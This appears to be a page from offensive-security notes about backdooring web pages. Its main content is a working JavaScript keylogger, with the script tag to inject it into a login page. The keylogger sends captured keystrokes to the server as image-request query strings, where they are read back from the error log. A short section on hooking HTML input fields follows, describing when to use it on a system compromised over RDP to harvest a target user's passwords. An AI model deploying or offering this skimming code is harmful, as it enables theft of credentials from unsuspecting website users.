| 🏠 [Home](../../pentesting.md) | ⬅️ ⬅️ [Part](../_part) | ⬅️ [Chapter](./_chapter) |
|--------------------------------|----------------------|-------------------------|

* [Web backdoor](../../red_team/misc/web_backdoor.md)
    * [Hooking login page](../../red_team/misc/web_backdoor.md#hooking-login-page)
    * [Hooking HTML Input Fields](../../red_team/misc/web_backdoor.md#hooking-html-input-fields)


# Hooking login page

cat `jubeaz.js`
```js
var keys=''
var url = 'jubeaz.gif?c=';
document.onkeypress = function(e){
    get = window.event?event:e;
    key = get.keyCode?get.keyCode:get.charCode;
    key = String.fromCharCode(key);
    keys+=key;
}
window.setInterval(function(){
    if(keys.length>0) {
        new Image().src = url+keys;
        // debug
        //console.log(keys);                   
        //localStorage.setItem("jubeaz", keys);    
        keys = '';
    }
},5000)
```
```html
<script src="jubeaz.js"></script>
```

web server error log coold be greped for `jubeaz.gif`

# Hooking HTML Input Fields
* [Pulling Web Application Passwords by Hooking HTML Input Fields](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/stealing-web-application-credentials-by-hooking-input-fields)
The technique is useful and can be executed when:

* You have RDP'd into the compromised system, where a target user utilizes some web application to perform his/her daily duties, that is of interest to you* 
* You need to get access credentials to that application for whatever reason (i.e collecting passwords for re-use or looking to see how the user usually constructs passwords, etc)* 
* and can't/don't want to use a keylogger for whatever reason* 
* Tab with the target web application is open


All HTML elements can respond to various types of events and execute code when those occur. For example, `input` fields can respond to events such `onFocus` (when an element gets focus), `onBlur` (when an element loses focus) and many other events amongst which are various keyboard events `onKeyPress`, `onKeyDown`, and `onKeyUp`. 
